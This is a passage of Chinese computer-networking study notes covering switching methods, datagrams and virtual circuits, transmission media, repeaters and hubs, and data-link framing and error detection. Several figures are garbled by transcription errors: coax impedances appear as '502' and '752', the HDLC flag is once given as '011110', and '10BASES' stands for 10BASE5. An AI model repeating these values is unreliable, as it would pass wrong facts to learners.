<p>从通信资源的分配角度来看，“交换” 就是按照某种方式动态地分配传输线路的资源。电路交换的关键点是，在数据传输的过程中，用户始终占用端到端的固定传输带宽。</p>
<p><strong>优点如下：</strong></p>
<ul>
<li><strong>通信时延小</strong>：由于通信线路为通信双方用户专用，数据直达，因此传输数据的时延非常小。当传输的数据量较大时，这一优点非常明显</li>
<li><strong>有序传输</strong>：双方通信时按发送顺序传送数据，不存在失序问题</li>
<li><strong>没有冲突</strong>：不同的通信双方拥有不同的信道，不会出现争用物理信道的问题</li>
<li><strong>适用范围广</strong>：电路交换既适用于传输模拟信号，又适用于传输数字信号</li>
<li><strong>实时性强</strong>：通信双方之间的物理通路一旦建立，双方就可以随时通信</li>
<li><strong>控制简单</strong>：电路交换的交换设备（交换机等）及控制均较简单</li>
</ul>
<p><strong>缺点如下：</strong></p>
<ul>
<li><strong>建立连接时间长</strong>：电路交换的平均连接建立时间对计算机通信来说太长</li>
<li><strong>线路独占，使用效率低</strong>：电路交换连接建立后，物理通路被通信双方独占，即使通信线路空闲，也不能供其他用户使用，因而信道利用率低</li>
<li><strong>灵活性差</strong>：只要在通信双方建立的通路中的任何一点出了故障，就必须重新拨号建立新的连接，这对十分紧急和重要的通信是很不利的</li>
<li><strong>难以规格化</strong>：电路交换时，数据直达，不同类型、不同规格、不同速率的终端很难相互进行通信，也难以在通信过程中进行差错控制</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>电路建立后，除源结点和目的结点外，电路上的任何结点都采取 “直通方式” 接收数据和发送数据，即不会存在存储转发所耗费的时间</p>
</div>
</li>
<li>
<p><strong>报文交换</strong></p>
<p>数据交换的单位是报文，报文携带有目标地址、源地址等信息。报文交换在交换结点采用的是存储转发的传输方式。</p>
<p><strong>优点如下：</strong></p>
<ul>
<li><strong>无须建立连接</strong>：报文交换不需要为通信双方预先建立一条专用的通信线路，不存在建立连接时延，用户可以随时发送报文</li>
<li><strong>动态分配线路</strong>：当发送方把报文交给交换设备时，交换设备先存储整个报文，然后选择一条合适的空闲线路，将报文发送出去</li>
<li><strong>提高线路可靠性</strong>：如果某条传输路径发生故障，那么可重新选择另一条路径传输数据，因此提高了传输的可靠性</li>
<li><strong>提高线路利用率</strong>：通信双方不是固定占有一条通信线路，而是在不同的时间一段一段地部分占有这条物理通道，因而大大提高了通信线路的利用率</li>
<li><strong>提供多目标服务</strong>：一个报文可以同时发送给多个目的地址，这在电路交换中是很难实现的</li>
</ul>
<p><strong>缺点如下：</strong></p>
<ul>
<li>由于数据进入交换结点后要经历存储、转发这一过程，因此会引起转发时延（包括接收报文、检验正确性、排队、发送时间等）</li>
<li>报文交换对报文的大小没有限制，这就要求网络结点需要有较大的缓存空间</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>报文交换主要使用在早期的电报通信网中，现在较少使用，通常被较先进的分组交换方式所取代</p>
</div>
</li>
<li>
<p><strong>分组交换</strong></p>
<p>同报文交换一样，分组交换也采用存储转发方式，但解决了报文交换中大报文传输的问题。分组交换限制了每次传送的数据块大小的上限，把大的数据块划分为合理的小数据块，再加上一些必要的控制信息（如：源地址、目的地址和编号信息等），构成分组（Packet）。网络结点根据控制信息把分组送到下一个结点，下一个结点接收到分组后，暂时保存并排队等待传输，然后根据分组控制信息选择它的下一个结点，直到到达目的结点。</p>
<p><strong>优点如下：</strong></p>
<ul>
<li><strong>无建立时延</strong>：不需要为通信双方预先建立一条专用的通信线路，不存在连接建立时延，用户可随时发送分组</li>
<li><strong>线路利用率高</strong>：通信双方不是固定占有一条通信线路，而是在不同的时间一段一段地部分占有这条物理通路，因而大大提高了通信线路的利用率</li>
<li><strong>简化了存储管理（相对于报文交换）</strong>：因为分组的长度固定，相应的缓冲区的大小也固定，在交换结点中存储器的管理通常被简化为对缓冲区的管理，相对比较容易</li>
<li><strong>加速传输</strong>：分组是逐个传输的，可以使后一个分组的存储操作与前一个分组的转发操作并行，这种流水线方式减少了报文的传输时间。此外，传输一个分组所需的缓冲区比传输一次报文所需的缓冲区小得多，这样因缓冲区不足而等待发送的概率及时间也必然少得多</li>
<li><strong>减少了出错概率和重发数据量</strong>：因为分组较短，其出错概率必然减小，所以每次重发的数据量也就大大减少，这样不仅提高了可靠性，也减少了传输时延</li>
</ul>
<p><strong>缺点如下：</strong></p>
<ul>
<li><strong>存在存储转发时延</strong>：尽管分组交换比报文交换的传输时延少，但相对于电路交换仍存在存储转发时延，而且其结点交换机必须具有更强的处理能力</li>
<li><strong>需要传输额外的信息量</strong>：每个小数据块都要加上源地址、目的地址和分组编号等信息，从而构成分组，因此使得传送的信息量增大了 <code>5%~10%</code>，一定程度上降低了通信效率，增加了处理的时间，使控制复杂，时延增加</li>
<li>当分组交换采用数据报服务时，可能会出现失序、丢失或重复分组，分组到达目的结点时，要对分组按编号进行排序等工作，因此很麻烦。若采用虚电路服务，虽无失序问题，但有呼叫建立、数据传输和虚电路释放三个过程</li>
</ul>
</li>
</ol>
<h4> 数据报与虚电路</h4>
<p>分组交换根据其通信子网向端点系统提供的服务，还可进一步分为 <strong>面向连接的虚电路方式</strong> 和 <strong>无连接的数据报方式</strong>。这两种服务方式都由网络层提供。要注意数据报方式和虚电路方式是分组交换的两种方式。</p>
<ol>
<li>
<p><strong>数据报</strong></p>
<p>作为通信子网用户的端系统发送一个报文时，在端系统中实现的高层协议先把报文拆成若干带有序号的数据单元，并在网络层加上地址等控制信息后形成数据报分组（即网络层的 PDU）。中间结点存储分组很短一段时间，找到最佳的路由后，尽快转发每个分组。不同的分组可以走不同的路径，也可以按不同的顺序到达目的结点。</p>
<p>如下图例子来说明数据报服务的原理。假定主机 A 要向主机 B 发送分组。</p>
<figure><figcaption>数据报方式转发分组</figcaption></figure>
<ul>
<li>主机 A 先将分组逐个发往与它直接相连的交换结点 A，交换结点 A 缓存收到的分组</li>
<li>然后查找自己的转发表。由于不同时刻的网络状态不同，因此转发表的内容可能不完全相同，所以有的分组转发给交换结点 C，有的分组转发给交换结点 D</li>
<li>网络中的其他结点收到分组后，类似地转发分组，直到分组最终到达主机 B</li>
</ul>
<p>当分组正在某一链路上传送时，分组并不占用网络的其他部分资源。因为采用存储转发技术，资源是共享的，所以主机 A 在发送分组时，主机 B 也可同时向其他主机发送分组。</p>
<p><strong>数据报服务具有如下特点：</strong></p>
<ul>
<li>发送分组前不需要建立连接。发送方可随时发送分组，网络中的结点可随时接收分组</li>
<li>网络尽最大努力交付，传输不保证可靠性，所以可能丢失；网络为每个分组独立地选择路由，转发的路径可能不同，因而分组不一定按序到达目的结点</li>
<li>发送的分组中要包括发送端和接收端的完整地址，以便可以独立传输</li>
<li>分组在交换结点存储转发时，需要排队等候处理，这会带来一定的时延。通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组</li>
<li>网络具有冗余路径，当某个交换结点或一条链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障的适应能力强</li>
<li>存储转发的延时一般较小，提高了网络的吞吐量</li>
<li>收发双方不独占某条链路，资源利用率较高</li>
</ul>
</li>
<li>
<p><strong>虚电路</strong></p>
<p>虚电路方式试图将数据报方式与电路交换方式结合起来，充分发挥两种方法的优点，以达到最佳的数据交换效果。在分组发送之前，要求在发送方和接收方建立一条逻辑上相连的虚电路，并且连接一旦建立，就固定了虚电路所对应的物理路径。与电路交换类似，整个通信过程分为三个阶段：虚电路建立、数据传输与虚电路释放。</p>
<p>在虚电路方式中，端系统每次建立虚电路时，选择一个未用过的虚电路号分配给该虚电路，以区别于本系统中的其他虚电路。在传送数据时，每个数据分组不仅要有分组号、校验和等控制信息，还要有它要通过的虚电路号，以区别于其他虚电路上的分组。在虚电路网络中的每个结点上都维持一张虚电路表，表中的每项记录了一个打开的虚电路的信息，包括在接收链路和发送链路上的虚电路号、前一结点和下一结点的标识。数据的传输是双向进行的，上述信息是在虚电路的建立过程中确定的。</p>
<p>虚电路方式的工作原理如下图所示：</p>
<figure><figcaption>虚电路方式</figcaption></figure>
<ul>
<li>为进行数据传输，主机 A 与主机 B 之间先建立一条逻辑通路，主机 A 发出一个特殊的 “呼叫请求” 分组，该分组通过中间结点送往主机 B，若主机 B 同意连接，则发送 “呼叫应答” 分组予以确认</li>
<li>虚电路建立后，主机 A 就可向主机 B 发送数据分组。当然，主机 B 也可在该虚电路上向主机 A 发送数据</li>
<li>传送结束后主机 A 通过发送 “释放请求” 分组来拆除虚电路，逐段断开整个连接</li>
</ul>
<p><strong>虚电路服务具有如下特点：</strong></p>
<ul>
<li>虚电路通信链路的建立和拆除需要时间开销，对交互式应用和小量的短分组情况显得很浪费，但对长时间、频繁的数据交换效率较高</li>
<li>虚电路的路由选择体现在连接建立阶段，连接建立后，就确定了传输路径</li>
<li>虚电路提供了可靠的通信功能，能保证每个分组正确且有序到达。此外，还可以对两个数据端点的流量进行控制，当接收方来不及接收数据时，可以通知发送方暂缓发送</li>
<li>虚电路有一个致命的弱点，即当网络中的某个结点或某条链路出现故障而彻底失效时，所有经过该结点或该链路的虚电路将遭到破坏</li>
<li>分组首部不包含目的地址，包含的是虚电路标识符，相对于数据报方式，其开销小</li>
</ul>
<p>虚电路之所以是 “虚” 的，是因为这条电路不是专用的，每个结点到其他结点之间的链路可能同时有若干虚电路通过，也可能同时与多个结点之间建立虚电路。每条虚电路支持特定的两个端系统之间的数据传输，两个端系统之间也可以有多条虚电路为不同的进程服务，这些虚电路的实际路由可能相同也可能不同。</p>
</li>
<li>
<p><strong>数据报服务和虚电路服务的比较</strong></p>
<p>数据报服务和虚电路服务的比较如下表所示：</p>
<table>
<thead>
<tr>
<th style="text-align:center">特点</th>
<th style="text-align:center">数据报服务</th>
<th style="text-align:center">虚电路服务</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">连接的建立</td>
<td style="text-align:center">不需要</td>
<td style="text-align:center">必须有</td>
</tr>
<tr>
<td style="text-align:center">目的地址</td>
<td style="text-align:center">每个分组都有完整的目的地址</td>
<td style="text-align:center">仅在建立连接阶段使用，之后每个分组使用长度较短的虚电路号</td>
</tr>
<tr>
<td style="text-align:center">路由选择</td>
<td style="text-align:center">每个分组独立地进行路由选择和转发</td>
<td style="text-align:center">属于同一条虚电路的分组按照同一路由转发</td>
</tr>
<tr>
<td style="text-align:center">分组顺序</td>
<td style="text-align:center">不保证分组的有序到达</td>
<td style="text-align:center">保证分组的有序到达</td>
</tr>
<tr>
<td style="text-align:center">可靠性</td>
<td style="text-align:center">不保证可靠通信，可靠性由用户主机来保证</td>
<td style="text-align:center">可靠性由网络保证</td>
</tr>
<tr>
<td style="text-align:center">对网络故障的适应性</td>
<td style="text-align:center">出故障的结点丢失分组，其他分组路径选择发生变化时可以正常传输</td>
<td style="text-align:center">所有经过故障结点的虚电路均不能正常工作</td>
</tr>
<tr>
<td style="text-align:center">差错处理和流量控制</td>
<td style="text-align:center">由用户主机进行流量控制，不保证数据报的可靠性</td>
<td style="text-align:center">可由分组交换网负责，也可由用户主机负责</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h3> 传输介质</h3>
<h4> 双绞线、同轴电缆、光纤与无线传输介质</h4>
<p>传输介质也称传输媒体，它是 <strong>数据传输系统中发送设备和接收设备之间的物理通路</strong>。传输介质可分为导向传输介质和非导向传输介质。在导向传输介质中，电磁波被导向沿着固体媒介（铜线或光纤）传播，而非导向传输介质可以是空气、真空或海水等。</p>
<ol>
<li>
<p><strong>双绞线</strong></p>
<p>双绞线是最常用的古老传输介质，它 <strong>由两根采用一定规则并排绞合的、相互绝缘的铜导线组成</strong>。绞合可以减少对相邻导线的电磁干扰。为了进一步提高抗电磁干扰的能力，可在双绞线的外面再加上一层，即用金属丝编织成的屏蔽层，这就是屏蔽双绞线（STP）。无屏蔽层的双绞线称为非屏蔽双绞线（UTP）。</p>
<p>双绞线的价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。双绞线的带宽取决于铜线的粗细和传输的距离。模拟传输和数字传输都可使用双绞线，其通信距离一般为几千米到数十千米。距离太远时，对于模拟传输，要用放大器放大衰减的信号；对于数字传输，要用中继器将失真的信号整形。</p>
</li>
<li>
<p><strong>同轴电缆</strong></p>
<p>同轴电缆 <strong>由内导体、绝缘层、网状编织屏蔽层和塑料外层构成</strong>。按特性阻抗数值的不同，通常将同轴电缆分为两类：502 同轴电缆和 752 同轴电缆。其中，502 同轴电缆主要用于传送基带数字信号，又称基带同轴电缆，它在局域网中应用广泛；752 同轴电缆主要用于传送宽带信号，又称宽带同轴电缆，主要用于有线电视系统。</p>
<p>由于外导体屏蔽层的作用，同轴电缆具有良好的抗干扰特性，被广泛用于传输较高速率的数据，其传输距离更远，但价格较双绞线贵。</p>
</li>
<li>
<p><strong>光纤</strong></p>
<p>光纤通信就是利用光导纤维（简称光纤）传递光脉冲来进行通信。有光脉冲表示 <code>1</code>，无光脉冲表示 <code>0</code>。可见光的频率约为 10<sup>8</sup>MHz，因此光纤通信系统的带宽范围极大。</p>
<p>光纤主要 <strong>由纤芯和包层构成</strong>，纤芯很细，其直径只有 <code>8~100μm</code>，光波通过纤芯进行传导，包层较纤芯有较低的折射率。当光线从高折射率的介质射向低折射率的介质时，其折射角将大于入射角。因此，只要入射角大于某个临界角度，就会出现全反射，即光线碰到包层时就会折射回纤芯，这个过程不断重复，光也就沿着光纤传输下去。</p>
<p>利用光的全反射特性，可以将从不同角度入射的多条光线在一根光纤中传输，这种光纤称为 <strong>多模光纤</strong>，多模光纤的光源为发光二极管。光脉冲在多模光纤中传输时会逐渐展宽，造成失真，因此多模光纤只适合于近距离传输。</p>
<p>光纤的直径减小到只有一个光的波长时，光纤就像一根波导那样，可使光线一直向前传播，而不会产生多次反射，这样的光纤就是 <strong>单模光纤</strong>。单模光纤的纤芯很细，直径只有几微米，制造成本较高。同时，单模光纤的光源为定向性很好的半导体激光器，因此单模光纤的衰减较小，可传输数公里甚至数十千米而不必采用中继器，适合远距离传输。</p>
<p>光纤不仅具有通信容量非常大的优点，还具有如下特点：</p>
<ul>
<li>传输损耗小，中继距离长，对远距离传输特别经济</li>
<li>抗雷电和电磁干扰性能好。这在有大电流脉冲干扰的环境下尤为重要</li>
<li>无串音干扰，保密性好，也不易被窃听或截取数据</li>
<li>体积小，重量轻。这在现有电缆管道已拥塞不堪的情况下特别有利</li>
</ul>
</li>
<li>
<p><strong>无线传输介质</strong></p>
<p>无线通信已广泛应用于移动电话领域，构成蜂窝式无线电话网。随着便携式计算机的出现，以及在军事、野外等特殊场合下移动通信联网的需要，促进了数字化移动通信的发展，现在无线局域网产品的应用已非常普遍。</p>
<ul>
<li>
<p><strong>无线电波</strong></p>
<p>无线电波具有较强的穿透能力，可以传输很长的距离，所以它被广泛应用于通信领域，如：无线手机通信、计算机网络中的无线局域网（WLAN）等。因为无线电波使信号向所有方向散播，因此有效距离范围内的接收设备无须对准某个方向，就可与无线电波发射者进行通信连接，大大简化了通信连接。这也是无线电传输的最重要优点之一。</p>
</li>
<li>
<p><strong>微波、红外线和激光</strong></p>
<p>目前高带宽的无线通信主要使用三种技术：微波、红外线和激光。它们都需要发送方和接收方之间存在一条视线（Line-of-sight）通路，有很强的方向性，都沿直线传播，有时统称这三者为视线介质。不同的是，红外通信和激光通信把要传输的信号分别转换为各自的信号格式，即红外光信号和激光信号，再直接在空间中传播。</p>
<p>微波通信的频率较高，频段范围也很宽，载波频率通常为 <code>2~40GHz</code>，因而通信信道的容量大。例如：一个带宽为 <code>2MHz</code> 的频段可容纳 <code>500</code> 条语音线路，若用来传输数字信号，数据率可达数兆比特/秒。与通常的无线电波不同，微波通信的信号是沿直线传播的，因此在地面的传播距离有限，超过一定距离后就要用中继站来接力。</p>
<p>卫星通信利用地球同步卫星作为中继来转发微波信号，可以克服地面微波通信距离的限制。三颗相隔 120° 的同步卫星几乎能覆盖整个地球表面，因而基本能实现全球通信。卫星通信的优点是通信容量大、距离远、覆盖广，缺点是保密性差、端到端传播时延长。</p>
</li>
</ul>
</li>
</ol>
<h4> 物理层接口的特性</h4>
<p>物理层考虑的是如何在连接到各种计算机的传输媒体上传输数据比特流，而不指具体的传输媒体。网络中的硬件设备和传输介质的种类繁多，通信方式也各不相同。物理层应尽可能屏蔽这些差异，让数据链路层感觉不到这些差异，使数据链路层只需考虑如何完成本层的协议和服务。</p>
<p>物理层的主要任务可以描述为确定与传输媒体的接口有关的一些特性：</p>
<ul>
<li><strong>机械特性</strong>：指明接口所用接线器的形状和尺寸、引脚数目和排列、固定和锁定装置等</li>
<li><strong>电气特性</strong>：指明在接口电缆的各条线上出现的电压的范围</li>
<li><strong>功能特性</strong>：指明某条线上出现的某一电平的电压表示何种意义</li>
<li><strong>过程特性</strong>：或称规程特性。指明对于不同功能的各种可能事件的出现顺序</li>
</ul>
<p>常用的物理层接口标准有 EIARS-232-C、ADSL 和 SONET/SDH 等。</p>
<h3> 物理层设备</h3>
<h4> 中继器</h4>
<p>中继器的主要功能是 <strong>将信号整形并放大再转发出去</strong>，以消除信号经过一长段电缆后而产生的失真和衰减，使信号的波形和强度达到所需要的要求，进而扩大网络传输的距离。其原理是信号再生（而非简单地将衰减的信号放大）。中继器有两个端口，数据从一个端口输入，再从另一个端口发出。端口仅作用于信号的电气部分，而不管是否有错误数据或不适于网段的数据。</p>
<p>中继器是用来扩大网络规模的最简单廉价的互连设备。中继器两端的网络部分是网段，而不是子网，使用中继器连接的几个网段仍然是一个局域网。中继器若出现故障，对相邻两个网段的工作都将产生影响。由于中继器工作在物理层，因此它不能连接两个具有不同速率的局域网。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果某个网络设备具有存储转发的功能，那么可以认为它能连接两个不同的协议；如果该网络设备没有存储转发功能，那么认为它不能连接两个不同的协议。中继器没有存储转发功能，因此它不能连接两个速率不同的网段，中继器两端的网段一定要使用同一个协议</p>
</div>
<p>从理论上讲，中继器的使用数目是无限的，网络因而也可以无限延长。但事实上这不可能，因为网络标准中对信号的延迟范围做了具体的规定，中继器只能在此规定范围内进行有效的工作，否则会引起网络故障。例如：在采用粗同轴电缆的 <code>10BASES</code> 以太网规范中，互相串联的中继器的个数不能超过 <code>4</code> 个，而且用 <code>4</code> 个中继器串联的 <code>5</code> 段通信介质中只有 <code>3</code> 段可以挂接计算机，其余两段只能用作扩展通信范围的链路段，不能挂接计算机。这就是所谓的 “5-4-3 规则”。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>放大器和中继器都起放大作用，只不过放大器放大的是模拟信号，原理是将衰减的信号放大，而中继器放大的是数字信号，原理是将衰减的信号整形再生</p>
</div>
<h4> 集线器</h4>
<p>集线器（Hub）实质上是一个多端口的中继器。当 Hub 工作时，一个端口接收到数据信号后，由于信号在从端口到 Hub 的传输过程中已有衰减，所以 Hub 便将该信号进行整形放大，使之再生（恢复）到发送时的状态，紧接着转发到其他所有（除输入端口外）处于工作状态的端口。如果同时有两个或多个端口输入，那么输出时会发生冲突，致使这些数据都无效。从 Hub 的工作方式可以看出，它在网络中只起信号放大和转发作用，目的是扩大网络的传输范围，而不具备信号的定向传送能力，即信息传输的方向是固定的，是一个标准的共享式设备。</p>
<p>Hub 主要使用双绞线组建共享网络，是从服务器连接到桌面的最经济方案。在交换式网络中，Hub 直接与交换机相连，将交换机端口的数据送到桌面上。使用 Hub 组网灵活，它把所有结点的通信集中在以其为中心的结点上，对结点相连的工作站进行集中管理，不让出问题的工作站影响整个网络的正常运行，并且用户的加入和退出也很自由。由 Hub 组成的网络是共享式网络，但逻辑上仍是一个总线网。Hub 的每个端口连接的网络部分是同一个网络的不同网段，同时 Hub 也只能在半双工状态下工作，网络的吞吐率因而受到限制。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>多台计算机必然会发生同时通信的情形，因此集线器不能分割冲突域，所有集线器的端口都属于同一个冲突域。集线器在一个时钟周期中只能传输一组信息，如果一台集线器连接的机器数目较多，且多台机器经常需要同时通信，那么将导致信息碰撞，使得集线器的工作效率很差。比如：一个带宽为 <code>10Mb/s</code> 的集线器上连接了 <code>8</code> 台计算机，当这 <code>8</code> 台计算机同时工作时，每台计算机真正所拥有的带宽为 <code>10/8Mb/s = 1.25Mb/s</code></p>
</div>
<h2> 数据链路层</h2>
<h3> 数据链路层的功能</h3>
<p>数据链路层在物理层提供服务的基础上向网络层提供服务，其 <strong>主要作用是加强物理层传输原始比特流的功能</strong>，将物理层提供的可能出错的物理连接改造为逻辑上无差错的数据链路，使之对网络层表现为一条无差错的链路。</p>
<h4> 为网络层提供服务</h4>
<p>对网络层而言，数据链路层的基本任务是将源机器中来自网络层的数据传输到目标机器的网络层。<strong>数据链路层通常可为网络层提供如下服务：</strong></p>
<ul>
<li><strong>无确认的无连接服务</strong>：源机器发送数据帧时不需先建立链路连接，目的机器收到数据帧时不需发回确认。对丢失的帧，数据链路层不负责重发而交给上层处理。适用于实时通信或误码率较低的通信信道，如：以太网</li>
<li><strong>有确认的无连接服务</strong>：源机器发送数据时不需先建立链路连接，但目的机器收到数据帧时必须发回确认。源机器在所规定的时间内未收到确定信号时，就重传丢失的帧，以提高传输的可靠性。该服务适用于误码率较高的通信信道，如：无线通信</li>
<li><strong>有确认的面向连接服务</strong>：帧传输过程分为三个阶段：建立数据链路、传输帧、释放数据链路。目的机器对收到的每一帧都要给出确认，源机器收到确认后才能发送下一帧，因而该服务的可靠性最高。该服务适用于通信要求（可靠性、实时性）较高的场合</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>有连接就一定要有确认，即不存在无确认的面向连接的服务</p>
</div>
<h4> 链路管理</h4>
<p><strong>数据链路层连接的建立、维持和释放过程称为链路管理，它主要用于面向连接的服务</strong>。链路两端的结点要进行通信，必须首先确认对方已处于就绪状态，并交换一些必要的信息以对帧序号初始化，然后才能建立连接，在传输过程中则要能维持连接，而在传输完毕后要释放该连接。在多个站点共享同一物理信道的情况下（如在局域网中）如何在要求通信的站点间分配和管理信道也属于数据链路层管理的范畴。</p>
<h4> 帧定界、帧同步与透明传输</h4>
<p>两台主机之间传输信息时，必须将网络层的分组封装成帧，以帧的格式进行传送。将一段数据的前后分别添加首部和尾部，就构成了帧。因此，帧长等于数据部分的长度加上首部和尾部的长度。首部和尾部中含有很多控制信息，它们的一个重要作用是确定的界限，即 <strong>帧定界</strong>。而 <strong>帧同步</strong> 指的是接收方应能从接收到的二进制比特流中区分出帧的起始与终止。如在 HDLC 协议中，用标识位 F（011110）来标识帧的开始和结束。通信过程中，检测到帧标识位 <code>F</code> 即认为是帧的开始，然后一旦检测到帧标识位 <code>F</code> 即表示帧的结束。为了提高帧的传输效率，应当使帧的数据部分的长度尽可能地大于首部和尾部的长度，但每种数据链路层协议都规定了帧的数据部分的长度上限——最大传送单元（MTU）。</p>
<p>如果在数据中恰好出现与帧定界符相同的比特组合（会误认为 “传输结束” 而丢弃后面的数据），那么就要采取有效的措施解决这个问题，即 <strong>透明传输</strong>。更确切地说，透明传输就是不管所传数据是什么样的比特组合，都应当能在链路上传送。</p>
<h4> 流量控制</h4>
<p>由于收发双方各自的工作速率和缓存空间的差异，可能出现发送方的发送能力大于接收方的接收能力的现象，如若此时不适当限制发送方的发送速率（即链路上的信息流量），前面来不及接收的帧将会被后面不断发送来的帧 “淹没”，造成帧的丢失而出错。因此，<strong>流量控制实际上就是限制发送方的数据流量，使其发送速率不超过接收方的接收能力。</strong></p>
<p>这个过程需要通过某种反馈机制使发送方能够知道接收方是否能跟上自己，即需要有一些规则使得发送方知道在什么情况下可以接着发送下一帧，而在什么情况下必须暂停发送，以等待收到某种反馈信息后继续发送。</p>
<p>流量控制并不是数据链路层特有的功能，许多高层协议中也提供此功能，只不过控制的对象不同而已。对于数据链路层来说，控制的是相邻两结点之间数据链路上的流量，而对于传输层来说，控制的则是从源端到目的端之间的流量。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在 OSI 体系结构中，数据链路层具有流量控制的功能。而在 TCP/IP 体系结构中，流量控制功能被移到了传输层</p>
</div>
<h4> 差错控制</h4>
<p>由于信道噪声等各种原因，帧在传输过程中可能会出现错误。<strong>用以使发送方确定接收方是否正确收到由其发送的数据的方法称为差错控制</strong>。通常，这些错误可分为位错和帧错。</p>
<ul>
<li><strong>位错</strong>：指帧中某些位出现了差错。通常采用循环冗余校验（CRC）方式发现位错，通过自动重传请求（Automatic Repeat reQuest，ARQ）方式来重传出错的帧。具体做法是：让发送方将要发送的数据帧附加一定的 CRC 冗余检错码一并发送，接收方则根据检错码对数据帧进行错误检测，若发现错误则丢弃，发送方超时重传该数据帧。这种差错控制方法称为 ARQ 法。ARQ 法只需返回很少的控制信息就可有效地确认所发数据帧是否被正确接收。</li>
<li><strong>帧错</strong>：指的丢失、重复或失序等错误。在数据链路层引入定时器和编号机制，能保证每一帧最终都能有且仅有一次正确地交付给目的结点。</li>
</ul>
<h3> 组帧</h3>
<p>数据链路层之所以要把比特组合成帧为单位传输，是为了在出错时只重发出错的帧，而不必重发全部数据，从而提高效率。为了使接收方能正确地接收并检查所传输的帧，发送方必须依据一定的规则把网络层递交的分组封装成帧（称为组帧）。<strong>组帧主要解决帧定界、帧同步、透明传输等问题</strong>。通常有以下四种方法实现组帧。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>组帧时既要加首部，又要加尾部。原因是，在网络中信息是以帧为最小单位进行传输的，所以接收端要正确地接收帧，必须要清楚该帧在一串比特流中从哪里开始到哪里结束（因为接收端收到的是一串比特流，没有首部和尾部是不能正确区分帧的）。而分组（即 IP 数据报）仅是包含在帧中的数据部分，所以不需要加尾部来定界</p>
</div>
<h4> 字符计数法</h4>
<p>指在帧头部使用一个计数字段来标明帧内字符数。目的结点的数据链路层收到字节计数值时，就知道后面跟随的字节数，从而可以确定帧结束的位置（计数字段提供的字节数包含自身所占用的一个字节）。</p>
<p>这种方法最大的问题在于如果计数字段出错，即失去了帧边界划分的依据，那么接收方就无法判断所传输帧的结束位和下一帧的开始位，收发双方将失去同步，从而造成灾难性后果。</p>
<h4> 字符填充的首尾定界符法</h4>
<p>字符填充法使用特定字符来定界一帧的开始与结束，例如：将控制字符 SOH 放在帧的最前面，表示帧的首部开始，控制字符 EOT 表示帧的结束。为了使信息位中出现的特殊字符不被误判为帧的首尾定界符，可在特殊字符前面填充一个转义字符（ESC）来加以区分（<strong>注意</strong>：转义字符是 ASCI 码中的控制字符，是一个字符，而非 “E” “S” “C” 三个字符的组合），以实现数据的透明传输。接收方收到转义字符后，就知道其后面紧跟的是数据信息，而不是控制信息。</p>
<p>例如：帧的数据段中出现 EOT 或 SOH 字符，发送方在每个 EOT 或 SOH 字符前再插入一个 ESC 字符，接收方收到数据后会自己删除这个插入的 ESC 字符，结果仍得到原来的数据。这也正是字符填充法名称的由来。如果转义字符 ESC 也出现在数据中，那么解决方法仍是在转义字符前插入一个转义字符。</p>
<h4> 零比特填充的首尾标志法</h4>
<p>零比特填充法允许数据帧包含任意个数的比特，也允许每个字符的编码包含任意个数的比特。它使用一个特定的比特模式，即 <code>01111110</code> 来标志一帧的开始和结束。为了不使信息位中出现的比特流 <code>01111110</code> 被误判为帧的首尾标志，发送方的数据链路层在信息位中遇到 <code>5</code> 个连续的 <code>1</code> 时，将自动在其后插入一个 <code>0</code>；而接收方做该过程的逆操作，即每收到 <code>5</code> 个连续的 <code>1</code> 时，自动删除后面紧跟的 <code>0</code>，以恢复原信息。</p>
<p>零比特填充法很容易由硬件来实现，性能优于字符填充法。</p>
<h4> 违规编码法</h4>
<p>在物理层进行比特编码时，通常采用违规编码法。例如：曼彻斯特编码方法将数据比特 <code>1</code> 编码成 “高-低” 电平对，将数据比特 <code>0</code> 编码成 “低-高” 电平对，而 “高-高” 电平对和 “低-低” 电平对在数据比特中是违规的（即没有采用）。可以借用这些违规编码序列来定界帧的起始和终止。局域网 IEEE 802 标准就采用了这种方法。</p>
<p>违规编码法不需要采用任何填充技术，便能实现数据传输的透明性，但它只适用于采用亢余编码的特殊编码环境。</p>
<p>由于字符计数法中计数字段的脆弱性和字符填充法实现上的复杂性与不兼容性，目前较常用的组帧方法是零比特填充法和违规编码法。</p>
<h3> 差错控制</h3>
<p>实际通信链路都不是理想的，比特在传输过程中可能会产生差错，<code>1</code> 可能会变成 <code>0</code>，<code>0</code> 也可能会变成 <code>1</code>，这就是比特差错。比特差错是传输差错中的一种，本节仅讨论比特差错。</p>
<p>通常利用编码技术进行差错控制，主要有两类：自动重传请求 ARQ 和前向纠错 FEC。在 ARQ 方式中，接收端检测到差错时，就设法通知发送端重发，直到接收到正确的码字为止。在 FEC 方式中，接收端不但能发现差错，而且能确定比特串的错误位置，从而加以纠正。因此，差错控制又可分为检错编码和纠错编码。</p>
<h4> 检错编码</h4>
<p>检错编码都采用冗余编码技术，其核心思想是在有效数据（信息位）被发送前，先按某种关系附加一定的冗余位，构成一个符合某一规则的码字后再发送。当要发送的有效数据变化时，相应的冗余位也随之变化，使得码字遵从不变的规则。接收端根据收到的码字是否仍符合原规则来判断是否出错。常见的检错编码有奇偶校验码和循环穴余码。</p>
<ol>
<li>
<p><strong>奇偶校验码</strong></p>
<p>奇偶校验码是奇校验码和偶校验码的统称，是一种最基本的检错码。它由 <code>n - 1</code> 位信息元和 <code>1</code> 位校验元组成，如果是奇校验码，那么在附加一个校验元后，码长为 <code>n</code> 的码字中 <code>1</code> 的个数为奇数；如果是偶校验码，那么在附加一个校验元以后，码长为 <code>n</code> 的码字中 <code>1</code> 的个数为偶数。它只能检测奇数位的出错情况，但并不知道哪些位错了，也不能发现偶数位的出错情况。</p>
</li>
<li>
<p><strong>循环冗余码</strong></p>
